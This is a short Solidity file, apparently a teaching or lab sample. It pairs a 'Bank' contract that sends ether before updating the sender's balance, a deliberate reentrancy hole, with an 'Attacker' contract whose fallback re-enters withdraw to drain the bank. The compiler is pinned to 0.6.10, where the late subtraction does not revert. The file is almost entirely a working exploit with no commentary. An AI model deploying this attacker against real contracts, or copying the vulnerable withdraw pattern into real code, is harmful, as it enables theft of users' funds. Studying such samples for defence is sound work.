// SPDX-License-Identifier: MIT

pragma solidity 0.6.10; //0.8.18;// 

contract Bank {
    mapping (address=>uint256) private deposits;
    event Log(uint256 value);

    function deposit() public payable {
        deposits[msg.sender]+=msg.value;
    }

    function withdraw(uint256 _amount) public {
        require(_amount<=deposits[msg.sender], "Not enough money!");
        (bool sent, ) = msg.sender.call{value:_amount}("");
        require(sent,"Failed to send money.");
        deposits[msg.sender]-=_amount;
        emit Log(deposits[msg.sender]);
    }
}

contract Attacker {

    Bank public target;
    uint256 withdrawValue;
    uint256 constant MONEY_LEFT = 1 ether;

    constructor (address payable _bankAddress) public {
        target = Bank(_bankAddress);
    }

    function deposit(uint256 _value) public {
        target.deposit{value:_value}();
    }

    function attack(uint256 _value) external payable {
        withdrawValue = _value;
        target.withdraw(withdrawValue);
    }

    fallback() external payable { 
       if (address(target)==address(msg.sender) && address(target).balance > MONEY_LEFT){
        target.withdraw(withdrawValue);  
       }
                 
    }
}
   